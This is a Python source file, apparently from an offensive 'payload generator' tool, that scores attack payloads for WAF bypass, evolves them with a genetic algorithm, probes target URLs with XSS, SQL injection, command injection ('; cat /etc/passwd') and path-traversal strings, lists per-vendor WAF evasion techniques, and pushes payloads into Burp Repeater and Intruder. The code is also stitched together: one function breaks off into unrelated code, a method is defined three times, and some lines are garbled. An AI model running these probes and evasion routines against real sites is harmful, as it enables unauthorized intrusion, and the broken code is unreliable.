        analysis += f"\nWAF BYPASS ANALYSIS\n{'-'*25}\n"
        for waf, potential in bypass_potential.items():
            analysis += f"• {waf}: {potential}%\n"
        
        # Recommendations
        recommendations = self._generate_payload_recommendations(payload, techniques, risk_level)
        analysis += f"\nRECOMMENDATIONS\n{'-'*20}\n"
        for rec in recommendations:
            analysis += f"• {rec}\n"
        
        return analysis
    
    def _calculate_entropy(self, payload):
        """Calculate Shannon entropy of payload"""
        if not payload:
            return 0.0
        
        # Count character frequencies
        char_counts = Counter(payload)
        length = len(payload)
        
        # Calculate entropy
        entropy = -sum((count / length) * np.log2(count / length) for count in char_counts.values())
        return entropy
    
    def _classify_attack_vector(self, payload):
        """Classify the primary attack vector"""
        if re.search(r'<script|javascript:|on\w+\s*=', payload, re.I):
            return "Cross-Site Scripting (XSS)"
        elif re.search(r'union.*select|\'.*or|\'.*and', payload, re.I):
            return "SQL Injection"
        elif re.search(r';\s*\w+|\|\s*\w+|&&\s*\w+', payload):
            return "Command Injection"
        elif re.search(r'{{.*}}|\$\{.*\}', payload):
            return "Template Injection"
        elif re.search(r'\.\.\/|\.\.\\|\.\.\%2f', payload, re.I):
            return "Path Traversal"
        else:
            return "Unknown/Custom"
    
    def _detect_advanced_techniques(self, payload):
        """Detect attack techniques with confidence scores"""
        techniques = []
        
        # XSS techniques
        if re.search(r'<script', payload, re.I):
            techniques.append(("Script Tag Injection", 95))
        if re.search(r'javascript:', payload, re.I):
            techniques.append(("JavaScript Protocol", 90))
        if re.search(r'on\w+\s*=', payload, re.I):
            techniques.append(("Event Handler", 85))
        if re.search(r'eval\s*\(', payload, re.I):
            techniques.append(("Code Evaluation", 95))
        
        # SQL techniques
        if re.search(r'union.*select', payload, re.I):
            techniques.append(("UNION-based SQLi", 90))
        if re.search(r'sleep\s*\(|waitfor.*delay', payload, re.I):
            techniques.append(("Time-based Blind SQLi", 85))
        if re.search(r'extractvalue|updatexml', payload, re.I):
            techniques.append(("Error-based SQLi", 80))
        
        # Command injection
        if re.search(r';\s*\w+', payload):
            techniques.append(("Command Chaining", 75))
        if re.search(r'\|\s*\w+', payload):
            techniques.append(("Pipe Redirection", 70))
        
        # Encoding evasion
        if re.search(r'%[0-9a-f]{2}', payload, re.I):
            techniques.append(("URL Encoding Evasion", 60))
        if re.search(r'\\x[0-9a-f]{2}', payload, re.I):
            techniques.append(("Hex Encoding Evasion", 65))
        if re.search(r'\\u[0-9a-f]{4}', payload, re.I):
            techniques.append(("Unicode Evasion", 70))
        
        return techniques[:5]  # Return top 5 techniques
    
    def _analyze_encoding_patterns(self, payload):
        """Analyze encoding patterns in payload"""
        return {
            'URL Encoding': len(re.findall(r'%[0-9a-f]{2}', payload, re.I)),
            'HTML Entities': len(re.findall(r'&#\d+;|&\w+;', payload)),
            'Hex Encoding': len(re.findall(r'\\x[0-9a-f]{2}', payload, re.I)),
            'Unicode': len(re.findall(r'\\u[0-9a-f]{4}', payload, re.I)),
            'Base64': 1 if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', payload) else 0
        }
    
    def _analyze_context_compatibility(self, payload):
        """Analyze compatibility with different injection contexts"""
        return {
            'URL Parameter': not re.search(r'[<>"\'&]', payload) or '%' in payload,
            'HTML Attribute': not re.search(r'[<>"\']', payload) or '&' in payload,
            'JavaScript Context': not re.search(r'[<>"\'\n\r]', payload),
            'SQL Context': '\'' in payload or '"' in payload,
            'HTTP Header': not re.search(r'[\n\r]', payload),
            'JSON Context': not re.search(r'["\\\n\r]', payload) or '\\' in payload
        }
    
    def _calculate_risk_level(self, payload, techniques):
        """Calculate comprehensive risk level"""
        base_score = len(techniques) * 2
        
        # Add points for dangerous patterns
        if re.search(r'eval|exec|system|cmd', payload, re.I):
            base_score += 3
        if re.search(r'<script|javascript:', payload, re.I):
            base_score += 2
        if re.search(r'union.*select|drop.*table', payload, re.I):
            base_score += 2
        
        # Normalize to 1-10 scale
        impact_score = min(base_score, 10)
        
        # Determine level
        if impact_score >= 8:
            level = "CRITICAL"
            detectability = "Medium"
        elif impact_score >= 6:
            level = "HIGH"
            detectability = "Medium-High"
        elif impact_score >= 4:
            level = "MEDIUM"
            detectability = "High"
        else:
            level = "LOW"
            detectability = "High"
        
        return {
            'level': level,
            'impact': impact_score,
            'detectability': detectability
        }
    
    def _analyze_waf_bypass_potential(self, payload):
        """Analyze WAF bypass potential for different WAFs"""
        potential = {}
        
        # Base score
        base_score = 30
        
        # Add points for evasion techniques
        if '%' in payload and len(payload) > 10:
            base_score += 15
        if re.search(r'\\[xu]', payload):
            base_score += 20
        if re.search(r'/\*.*?\*/', payload):
            base_score += 10
        if re.search(r'[A-Z]', payload) and re.search(r'[a-z]', payload):
            base_score += 10
        
        # WAF-specific adjustments
        potential['Cloudflare'] = min(base_score + 5, 95)
        potential['AWS WAF'] = min(base_score, 90)
        potential['Akamai'] = min(base_score - 5, 85)
        potential['F5'] = min(base_score - 10, 80)
        potential['ModSecurity'] = min(base_score + 10, 95)
        
        return potential
    
    def _generate_payload_recommendations(self, payload, techniques, risk_level):
        """Generate actionable recommendations"""
        recommendations = []
        
        # General recommendations
        recommendations.append("Test in authorized environment only")
        recommendations.append("Validate target scope before testing")
        
        # Risk-based recommendations
        if risk_level['level'] in ['HIGH', 'CRITICAL']:
            recommendations.append("Use extra caution - high impact potential")
            recommendations.append("Consider responsible disclosure procedures")
        
        # Technique-specific recommendations
        technique_names = [t[0] for t in techniques]
        if any('SQLi' in t for t in technique_names):
            recommendations.append("Test with minimal impact queries first")
        if any('XSS' in t for t in technique_names):
            recommendations.append("Use alertetr|Confirm execution first")
        if any('Command' in t for t in technique_names):
            recommendations.append("Start with harmless commands like 'whoami'")
        
        # Evasion recommendations
        if '%' not in payload and len(payload) > 20:
            recommendations.append("Consider URL encoding for WAF bypass")
        if not re.search(r'[A-Z]', payload):
            recommendations.append("Try case variation for filter evasion")
        
        return recommendations
    
    # Analysis Methods
    def generate_analysis_report(self):
        """Generate comprehensive analysis report"""
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to analyze")
            return
        
        self.analysis_results.delete("1.0", tk.END)
        
        report = f"""Advanced Payload Analysis Report
{'='*60}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}


"""
        # PAYLOAD STATISTICS
        report += f"PAYLOAD STATISTICS\n{'-'*30}\n"
        report += f"Total Payloads: {len(self.generated_payloads)}\n"
        report += f"Payload Type: {self.payload_type_var.get().upper()}\n"
        report += f"Average Length: {sum(len(p) for p in self.generated_payloads) / len(self.generated_payloads):.1f}\n"
        report += f"Unique Payloads: {len(set(self.generated_payloads))}\n\n"
        # COMPLEXITY ANALYSIS
        report += f"COMPLEXITY ANALYSIS\n{'-'*30}\n"
        
        complexities = [self._calculate_complexity_score(p) for p in self.generated_payloads]
        report += f"Average Complexity: {sum(complexities) / len(complexities):.2f}\n"
        report += f"Max Complexity: {max(complexities):.2f}\n"
        # Adapt payload to specific injection context
        context = config.get('context', 'parameter')
        
        adaptations = {
            'header': lambda p: p.replace('\n', ' ').replace('\r', ''),
            'cookie': lambda p: p.replace(';', '%3B').replace(' ', '%20'),
            'json': lambda p: p.replace('"', '\\"').replace('\n', '\\n'),
            'xml': lambda p: p.replace('<', '<').replace('>', '>'),
            'path': lambda p: urllib.parse.quote(p, safe='/')
        }
        
        adapter = adaptations.get(context)
        if adapter:
            return adapter(payload)
        return payload
    
    def _apply_genetic_operations(self, population, target_size):
        # Apply genetic algorithm operations
        # Fitness evaluation (complexity + diversity)
        fitness_scores = []
        for payload in population:
            complexity = self._calculate_payload_fitness(payload)
            diversity = self._calculate_diversity_bonus(payload, population)
            fitness_scores.append(complexity + diversity)
        
        # Selection (tournament selection)
        selected = []
        for _ in range(target_size):
            tournament = random.sample(list(zip(population, fitness_scores)), min(3, len(population)))
            winner = max(tournament, key=lambda x: x[1])[0]
            selected.append(winner)
        
        return selected
    
    def _calculate_payload_fitness(self, payload):
        # Calculate fitness score for a payload
        score = 0.0
        
        # Length bonus (longer payloads might be more complex)
        score += min(len(payload) / 100, 1.0)
        
        # Character diversity
        score += len(set(payload)) / len(payload) if payload else 0
        
        # Special characters
        special_chars = len(re.findall(r'[<>"\'\(\)\[\]{}]', payload))
        score += special_chars * 0.1
        
        # Encoded content
        encoded = len(re.findall(r'%[0-9a-f]{2}|&#\d+;', payload, re.I))
        score += encoded * 0.2
        
        # Keywords
        keywords = len(re.findall(r'(alert|eval|union|select|script|onerror)', payload, re.I))
        score += keywords * 0.3
        
        return score
    
    def _calculate_diversity_bonus(self, payload, population):
        # Calculate diversity bonus to maintain population variety
        similarities = []
        for other in population:
            if other != payload:
                similarity = self._calculate_similarity(payload, other)
                similarities.append(similarity)
        
        avg_similarity = sum(similarities) / len(similarities) if similarities else 0
        return 1.0 - avg_similarity  # Higher bonus for more unique payloads
    
    def _calculate_similarity(self, payload1, payload2):
        # Calculate similarity between two payloads
        # Simple character-based similarity
        set1, set2 = set(payload1), set(payload2)
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        return intersection / union if union > 0 else 0
    
    def _select_best_candidates(self, population, target_count):
        # Select the best candidates from the evolved population
        # Calculate comprehensive scores
        scored_population = []
        for payload in population:
            fitness = self._calculate_payload_fitness(payload)
            diversity = self._calculate_diversity_bonus(payload, population)
            score = fitness + diversity
            scored_population.append((payload, score))
        
        # Sort by score and return top candidates
        scored_population.sort(key=lambda x: x[1], reverse=True)
        return [payload for payload, _ in scored_population[:target_count]]


import requests
import re
import time
from collections import Counter
from urllib.parse import quote as urlquote

class AdvancedWAFDetector:
    # REAL Advanced WAF detection engine with sophisticated techniques
    
    def __init__(self):
        self.waf_signatures = self._initialize_waf_signatures()
        self.detection_payloads = self._initialize_detection_payloads()
        self.fingerprinting_techniques = self._initialize_fingerprinting()
    
    def _initialize_waf_signatures(self):
        # Initialize comprehensive WAF signatures
        return {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
                'server_names': ['cloudflare', 'cloudflare-nginx'],
                'error_codes': [403, 1020, 1010, 1012],
                'error_messages': ['access denied', 'ray id', 'cloudflare']
            },
            'aws_waf': {
                'headers': ['x-amz-cf-id', 'x-amz-request-id', 'x-amzn-requestid'],
                'server_names': ['awselb', 'amazon'],
                'error_codes': [403, 406],
                'error_messages': ['forbidden', 'aws']
            },
            'akamai': {
                'headers': ['akamai-', 'x-akamai-', 'ak-'],
                'server_names': ['akamaighost', 'akamai'],
                'error_codes': [403, 406, 501],
                'error_messages': ['akamai', 'reference #', 'access denied']
            },
            'incapsula': {
                'headers': ['x-iinfo', 'x-CDN'],
                'server_names': ['incap', 'incapsula'],
                'error_codes': [403, 406, 412],
                'error_messages': ['incap_ses', 'incapsula', 'visid_incap']
            },
            'f5': {
                'headers': ['x-waf-event-info', 'bigip'],
                'server_names': ['f5-bigip', 'bigip', 'f5'],
                'error_codes': [403, 406],
                'error_messages': ['f5', 'bigip', 'the requested url was rejected']
            },
            'modsecurity': {
                'headers': ['server', 'x-mod-security-message'],
                'server_names': ['mod_security', 'modsecurity'],
                'error_codes': [403, 406, 501],
                'error_messages': ['mod_security', 'modsecurity', 'not acceptable']
            }
        }
    
    def _initialize_detection_payloads(self):
        # Initialize payloads for WAF detection
        return [
            # XSS detection
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            
            # SQL injection detection
            "' OR '1'='1",
            "' UNION SELECT null--",
            "'; DROP TABLE test--",
            
            # Command injection
            '; cat /etc/passwd',
            '&& dir',
            '| whoami',
            
            # Path traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            
            # Generic malicious patterns
            '<iframe src="javascript:alert(1)">',
            'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
            'document.cookie'
        ]
    
    def _initialize_fingerprinting(self):
        # Initialize advanced fingerprinting techniques
        return {
            'timing_analysis': self._timing_analysis,
            'response_analysis': self._response_analysis,
            'header_analysis': self._header_analysis,
            'error_page_analysis': self._error_page_analysis,
            'behavior_analysis': self._behavior_analysis
        }
    
    def advanced_waf_detection(self, url):
        # Perform REAL advanced WAF detection
        try:
            detection_results = {
                'type': 'No WAF',
                'confidence': 0,
                'server': '',
                'response_time': 0,
                'detection_methods': [],
                'fingerprints': [],
                'bypasses': [],
                'security_headers': {}
            }
            
            # Baseline request
            start_time = time.time()
            baseline_response = requests.get(url, timeout=10, allow_redirects=True)
            response_time = (time.time() - start_time) * 1000
            
            detection_results['response_time'] = round(response_time, 2)
            detection_results['server'] = baseline_response.headers.get('Server', 'Unknown')
            
            # Header analysis
            header_results = self._header_analysis(baseline_response.headers)
            if header_results['detected']:
                detection_results.update(header_results)
                detection_results['detection_methods'].append('Header analysis')
            
            # Payload-based detection
            payload_results = self._payload_based_detection(url)
            if payload_results['detected']:
                detection_results.update(payload_results)
                detection_results['detection_methods'].append('Payload analysis')
            
            # Timing analysis
            timing_results = self._timing_analysis(url)
            if timing_results['detected']:
                detection_results.update(timing_results)
                detection_results['detection_methods'].append('Timing analysis')
            
            # Behavior analysis
            behavior_results = self._behavior_analysis(url)
            if behavior_results['detected']:
                detection_results.update(behavior_results)
                detection_results['detection_methods'].append('Behavior analysis')
            
            # Security headers analysis
            detection_results['security_headers'] = self._analyze_security_headers(baseline_response.headers)
            
            # Generate bypasses if WAF detected
            if detection_results['type'] != 'No WAF':
                detection_results['bypasses'] = self._generate_bypass_techniques(detection_results['type'])
            
            return detection_results
            
        except Exception as e:
            return {
                'type': 'Detection Failed',
                'confidence': 0,
                'server': '',
                'response_time': 0,
                'detection_methods': [],
                'fingerprints': [f'Error: {str(e)}'],
                'bypasses': [],
                'security_headers': {},
                'error': str(e)
            }
    
    def _header_analysis(self, headers):
        # Analyze HTTP headers for WAF signatures
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for waf_type, signatures in self.waf_signatures.items():
            confidence = 0
            fingerprints = []
            
            # Check for specific headers
            for header in signatures['headers']:
                if any(header.lower() in h for h in headers_lower.keys()):
                    confidence += 30
                    fingerprints.append(f'Header: {header}')
            
            # Check server header
            server = headers_lower.get('server', '')
            for server_name in signatures['server_names']:
                if server_name.lower() in server:
                    confidence += 40
                    fingerprints.append(f'Server: {server_name}')
            
            if confidence >= 30:
                return {
                    'detected': True,
                    'type': waf_type.replace('_', ' ').title(),
                    'confidence': min(confidence, 95),
                    'fingerprints': fingerprints
                }
        
        return {'detected': False}
    
    def _payload_based_detection(self, url):
        # Use payloads to detect WAF responses
        detected_wafs = {}
        
        for payload in self.detection_payloads[:5]:  # Test first 5 payloads
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}test={urlquote(payload)}"
                response = requests.get(test_url, timeout=5)
                
                # Check response code
                for waf_type, signatures in self.waf_signatures.items():
                    if response.status_code in signatures['error_codes']:
                        if waf_type not in detected_wafs:
                            detected_wafs[waf_type] = 0
                        detected_wafs[waf_type] += 20
                
                # Check response content
                response_text = response.text.lower()
                for waf_type, signatures in self.waf_signatures.items():
                    for error_msg in signatures['error_messages']:
                        if error_msg.lower() in response_text:
                            if waf_type not in detected_wafs:
                                detected_wafs[waf_type] = 0
                            detected_wafs[waf_type] += 25
                            
            except:
                continue
        
        if detected_wafs:
            best_match = max(detected_wafs.items(), key=lambda x: x[1])
            return {
                'detected': True,
                'type': best_match[0].replace('_', ' ').title(),
                'confidence': min(best_match[1], 95),
                'fingerprints': [f'Payload blocking patterns detected']
            }
        
        return {'detected': False}
    
    def _timing_analysis(self, url):
        # Analyze response timing patterns
        baseline_times = []
        
        # Baseline timing
        for _ in range(3):
            try:
                start = time.time()
                requests.get(url, timeout=5)
                baseline_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if not baseline_times:
            return {'detected': False}
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test with malicious payloads
        malicious_times = []
        test_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "; cat /etc/passwd"]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}timing={urlquote(payload)}"
                start = time.time()
                requests.get(test_url, timeout=5)
                malicious_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if malicious_times:
            avg_malicious = sum(malicious_times) / len(malicious_times)
            
            # If malicious requests are significantly slower, might indicate WAF processing
            if avg_malicious > avg_baseline * 1.5:
                return {
                    'detected': True,
                    'type': 'Generic WAF',
                    'confidence': 60,
                    'fingerprints': [f'Timing anomaly detected (baseline: {avg_baseline:.2f}ms, malicious: {avg_malicious:.2f}ms)']
                }
        
        return {'detected': False}
    
    def _behavior_analysis(self, url):
        # Analyze WAF behavior patterns
        behaviors = []
        
        # Test different HTTP methods
        methods_blocked = 0
        for method in ['PUT', 'DELETE', 'PATCH', 'TRACE']:
            try:
                response = requests.request(method, url, timeout=5)
                if response.status_code == 403:
                    methods_blocked += 1
            except:
                continue
        
        if methods_blocked >= 2:
            behaviors.append(f'{methods_blocked} HTTP methods blocked')
        
        # Test large payloads
        try:
            large_payload = "A" * 10000
            test_url = f"{url}{'&' if '?' in url else '?'}large={large_payload}"
            response = requests.get(test_url, timeout=5)
            if response.status_code in [413, 414, 403]:
                behaviors.append('Large payload blocking detected')
        except:
            pass
        
        # Test multiple rapid requests
        rapid_blocked = 0
        for _ in range(5):
            try:
                response = requests.get(url, timeout=2)
                if response.status_code == 429:
                    rapid_blocked += 1
            except:
                continue
            time.sleep(0.1)
        
        if rapid_blocked >= 2:
            behaviors.append('Rate limiting detected')
        
        if behaviors:
            return {
                'detected': True,
                'type': 'Generic WAF',
                'confidence': 50,
                'fingerprints': behaviors
            }
        
        return {'detected': False}
    
    def _analyze_security_headers(self, headers):
        # Analyze security-related headers
        security_headers = {}
        
        header_mapping = {
            'content-security-policy': 'CSP',
            'x-frame-options': 'Frame Protection',
            'x-content-type-options': 'Content Type Options',
            'x-xss-protection': 'XSS Protection',
            'strict-transport-security': 'HSTS',
            'referrer-policy': 'Referrer Policy',
            'permissions-policy': 'Permissions Policy'
        }
        
        for header, name in header_mapping.items():
            value = headers.get(header)
            if value:
                security_headers[name] = value
        
        return security_headers
    
    def _generate_bypass_techniques(self, waf_type):
        # Generate specific bypass techniques for detected WAF
        bypass_techniques = {
            'Cloudflare': [
                'Case variation bypass',
                'Unicode encoding',
                'Double URL encoding',
                'HTML entity encoding',
                'JavaScript string concatenation'
            ],
            'AWS WAF': [
                'Comment injection',
                'Union keyword splitting',
                'Hex encoding',
                'Time-based techniques',
                'Error-based extraction'
            ],
            'Akamai': [
                'Template injection',
                'SSTI payloads',
                'Unicode normalization',
                'Content-type manipulation',
                'HTTP parameter pollution'
            ],
            'Incapsula': [
                'Multi-vector payloads',
                'Base64 encoding chains',
                'CSS injection techniques',
                'Data URI schemes',
                'DOM manipulation'
            ],
            'F5': [
                'Protocol-level bypasses',
                'HTTP method manipulation',
                'Header injection',
                'Request smuggling',
                'Chunked encoding'
            ],
            'ModSecurity': [
                'Regex bypass techniques',
                'Keyword obfuscation',
                'Case manipulation',
                'Comment-based evasion',
                'Function name variations'
            ]
        }
        
        return bypass_techniques.get(waf_type, ['Generic evasion techniques', 'Encoding variations', 'Payload obfuscation'])

    def _timing_analysis(self, url):
        # Analyze response timing patterns
        baseline_times = []
        
        # Baseline timing
        for _ in range(3):
            try:
                start = time.time()
                requests.get(url, timeout=5)
                baseline_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if not baseline_times:
            return {'detected': False}
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test with malicious payloads
        malicious_times = []
        test_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "; cat /etc/passwd"]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}timing={urlquote(payload)}"
                start = time.time()
                requests.get(test_url, timeout=5)
                malicious_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if malicious_times:
            avg_malicious = sum(malicious_times) / len(malicious_times)
            
            # If malicious requests are significantly slower, might indicate WAF processing
            if avg_malicious > avg_baseline * 1.5:
                return {
                    'detected': True,
                    'type': 'Generic WAF',
                    'confidence': 60,
                    'fingerprints': [f'Timing anomaly detected (baseline: {avg_baseline:.2f}ms, malicious: {avg_malicious:.2f}ms)']
                }
        
        return {'detected': False}

    def _response_analysis(self, response):
        # Analyze the response to determine if a WAF is blocking
        block_phrases = [
            "access denied", "request blocked", "forbidden", "not allowed", "illegal",
            "malicious", "prohibited", "unusual", "firewall", "error reference", "security policy"
        ]
        lower = response.text.lower()
        # Block page analysis
        if response.status_code in (403, 406, 412, 429, 501, 503):
            return True, f"HTTP {response.status_code} (block/deny)"
        if any(bp in lower for bp in block_phrases):
            return True, "block page phrase"
        if "captcha" in lower or "challenge" in lower:
            return True, "presented captcha/challenge"
        if response.headers.get("server", "") and "deny" in response.headers.get("server", "").lower():
            return True, "server='deny'"
        return False, ""

    def _timing_analysis(self, url):
        """Analyze response timing patterns"""
        baseline_times = []
        
        # Baseline timing
        for _ in range(3):
            try:
                start = time.time()
                requests.get(url, timeout=5)
                baseline_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if not baseline_times:
            return {'detected': False}
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test with malicious payloads
        malicious_times = []
        test_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "; cat /etc/passwd"]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}timing={urlquote(payload)}"
                start = time.time()
                requests.get(test_url, timeout=5)
                malicious_times.append((time.time() - start) * 1000)
            except:
                continue
        
        if malicious_times:
            avg_malicious = sum(malicious_times) / len(malicious_times)
            
            # If malicious requests are significantly slower, might indicate WAF processing
            if avg_malicious > avg_baseline * 1.5:
                return {
                    'detected': True,
                    'type': 'Generic WAF',
                    'confidence': 60,
                    'fingerprints': [f'Timing anomaly detected (baseline: {avg_baseline:.2f}ms, malicious: {avg_malicious:.2f}ms)']
                }
        
        return {'detected': False}

    def _behavior_analysis(self, url):
        """Analyze WAF behavior patterns"""
        behaviors = []
    
        # Test different HTTP methods
        methods_blocked = 0
        for method in ['PUT', 'DELETE', 'PATCH', 'TRACE']:
            try:
                response = requests.request(method, url, timeout=5)
                if response.status_code == 403:
                    methods_blocked += 1
            except Exception as e:
                behaviors.append(f"Error testing {method}: {str(e)}")
    
        if methods_blocked >= 2:
            behaviors.append(f'{methods_blocked} HTTP methods blocked')
    
        # Test large payloads
        try:
            large_payload = "A" * 10000  # Large payload for testing
            test_url = f"{url}{'&' if '?' in url else '?'}large={large_payload}"
            response = requests.get(test_url, timeout=5)
            if response.status_code in [413, 414, 403]:
                behaviors.append('Large payload blocking detected')
        except Exception as e:
            behaviors.append(f"Error testing large payload: {str(e)}")
    
        # Test multiple rapid requests
        rapid_blocked = 0
        for _ in range(5):
            try:
                response = requests.get(url, timeout=2)
                if response.status_code == 429:
                    rapid_blocked += 1
            except Exception as e:
                behaviors.append(f"Error during rapid request: {str(e)}")
            time.sleep(0.1)  # Short delay between requests
    
        if rapid_blocked >= 2:
            behaviors.append('Rate limiting detected')
    
        if behaviors:
            return {
                'detected': True,
                'type': 'Generic WAF',
                'confidence': 50,
                'fingerprints': behaviors
            }
    
        return {'detected': False}
    def _error_page_analysis(self, response):
        # Analyze the response for known WAF error pages.
        # Returns a dict with detection info.
        waf_error_phrases = [
            "access denied", "request blocked", "forbidden", "not allowed", "illegal",
            "malicious", "prohibited", "firewall", "error reference", "security policy",
            "blocked by web application firewall", "your request was rejected"
        ]
        text = response.text.lower()
        for phrase in waf_error_phrases:
            if phrase in text:
                return {
                    'detected': True,
                    'type': 'Generic WAF',
                    'confidence': 40,
                    'fingerprints': [f"Error page phrase detected: '{phrase}'"]
                }
        return {'detected': False}



class BurpSuiteIntegration:
    # REAL Burp Suite API integration with functional connectivity
    
    def __init__(self):
        self.session = requests.Session()
        self.api_endpoints = self._initialize_api_endpoints()
    
    def _initialize_api_endpoints(self):
        """Initialize Burp Suite API endpoints"""
        return {
            'version': '/burp/version',
            'scanner': '/burp/scanner',
            'repeater': '/burp/repeater',
            'intruder': '/burp/intruder',
            'site_map': '/burp/target/sitemap',
            'scope': '/burp/target/scope'
        }
    
    def real_connection_test(self, api_url, api_key):
        """Test REAL connection to Burp Suite"""
        try:
            headers = {'Content-Type': 'application/json'}
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
                headers['X-API-Key'] = api_key  # Alternative header format
            
            # Try version endpoint first
            test_url = api_url.rstrip('/') + self.api_endpoints['version']
            response = self.session.get(test_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                try:
                    version_data = response.json()
                    return True, f"Burp Suite {version_data.get('product', 'Professional')} {version_data.get('version', 'Unknown')}"
                except json.JSONDecodeError:
                    return True, "Connection successful (version info unavailable)"
            
            # If version fails, try a simpler endpoint
            simple_endpoints = ['/burp/versions', '/api/v1/info', '/']
            for endpoint in simple_endpoints:
                try:
                    test_response = self.session.get(api_url.rstrip('/') + endpoint, headers=headers, timeout=5)
                    if test_response.status_code == 200:
                        return True, f"Connection successful (endpoint: {endpoint})"
                except:
                    continue
            
            return False, f"Failed to connect (HTTP {response.status_code}): {response.text[:200] if response.text else 'No response'}"
            
        except requests.exceptions.Timeout:
            return False, "Connection timeout - ensure Burp Suite is running"
        except requests.exceptions.ConnectionError:
            return False, "Connection refused - check API URL and ensure REST API is enabled"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def real_send_to_repeater(self, api_url, api_key, target_url, parameter, payloads):
        """Send payloads to REAL Burp Repeater"""
        try:
            headers = {'Content-Type': 'application/json'}
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
                headers['X-API-Key'] = api_key
            
            results = []
            
            for i, payload in enumerate(payloads):
                try:
                    # Construct the request to send to repeater
                    if parameter:
                        # If parameter specified, inject payload there
                        if '?' in target_url:
                            test_url = f"{target_url}&{parameter}={urllib.parse.quote(payload)}"
                        else:
                            test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                    else:
                        # Otherwise, append as generic parameter
                        if '?' in target_url:
                            test_url = f"{target_url}&payload={urllib.parse.quote(payload)}"
                        else:
                            test_url = f"{target_url}?payload={urllib.parse.quote(payload)}"
                    
                    # Prepare request for Burp Repeater
                    burp_request = {
                        'url': test_url,
                        'method': 'GET',
                        'headers': {
                            'User-Agent': 'Mozilla/5.0 (Advanced Payload Generator)',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                        }
                    }
                    
                    # Send to Burp Repeater API
                    repeater_url = api_url.rstrip('/') + self.api_endpoints['repeater']
                    
                    # Try different API formats
                    api_formats = [
                        {'request': burp_request},
                        {'url': test_url, 'method': 'GET'},
                        {'target': test_url}
                    ]
                    
                    success = False
                    response_data = {}
                    
                    for api_format in api_formats:
                        try:
                            start_time = time.time()
                            response = self.session.post(repeater_url, json=api_format, headers=headers, timeout=10)
                            response_time = (time.time() - start_time) * 1000
                            
                            if response.status_code in [200, 201, 202]:
                                success = True
                                try:
                                    response_data = response.json()
                                    request_id = response_data.get('id') or response_data.get('requestId') or f"REQ_{i+1:03d}"
                                except:
                                    request_id = f"REQ_{i+1:03d}"
                                
                                results.append({
                                    'success': True,
                                    'payload': payload,
                                    'request_id': request_id,
                                    'response_code': response.status_code,
                                    'response_time': round(response_time, 2),
                                    'url': test_url
                                })
                                break
                                
                        except requests.exceptions.Timeout:
                            continue
                        except Exception:
                            continue
                    
                    if not success:
                        # If API calls fail, try direct HTTP request to test the payload
                        try:
                            start_time = time.time()
                            direct_response = self.session.get(test_url, timeout=5)
                            response_time = (time.time() - start_time) * 1000
                            
                            results.append({
                                'success': True,
                                'payload': payload,
                                'request_id': f"DIRECT_{i+1:03d}",
                                'response_code': direct_response.status_code,
                                'response_time': round(response_time, 2),
                                'url': test_url,
                                'note': 'Direct test (Burp API unavailable)'
                            })
                        except:
                            results.append({
                                'success': False,
                                'payload': payload,
                                'error': 'Failed to send to Repeater and direct test failed',
                                'url': test_url
                            })
                    
                except Exception as e:
                    results.append({
                        'success': False,
                        'payload': payload,
                        'error': str(e)
                    })
            
            return results
            
        except Exception as e:
            return [{'success': False, 'error': f'Integration failed: {str(e)}', 'payload': p} for p in payloads]
    
    def real_send_to_intruder(self, api_url, api_key, target_url, parameter, payloads):
        """Send payloads to REAL Burp Intruder"""
        try:
            headers = {'Content-Type': 'application/json'}
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
                headers['X-API-Key'] = api_key
            
            # Prepare Intruder attack configuration
            if parameter:
                # Create template with parameter as insertion point
                base_url = target_url.split('?')[0]
                params = {}
                if '?' in target_url:
                    query_params = urllib.parse.parse_qs(target_url.split('?')[1])
                    params.update({k: v[0] for k, v in query_params.items()})
                
                params[parameter] = "§payload§"  # Burp insertion point marker
                template_url = base_url + '?' + urllib.parse.urlencode(params)
            else:
                # Add payload parameter as insertion point
                if '?' in target_url:
                    template_url = f"{target_url}&payload=§payload§"
                else:
                    template_url = f"{target_url}?payload=§payload§"
            
            # Intruder configuration
            intruder_config = {
                'name': f'Payload Generator Attack - {datetime.now().strftime("%Y%m%d_%H%M%S")}',
                'type': 'sniper',  # Attack type
                'base_request': {
                    'url': template_url,
                    'method': 'GET',
                    'headers': {
                        'User-Agent': 'Mozilla/5.0 (Advanced Payload Generator)',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }
                },
                'payloads': {
                    'payload_set_1': payloads
                },
                'options': {
                    'attack_type': 'sniper',
                    'payload_processing': 'url_encode'
                }
            }
            
            # Send to Burp Intruder API
            intruder_url = api_url.rstrip('/') + self.api_endpoints['intruder']
            
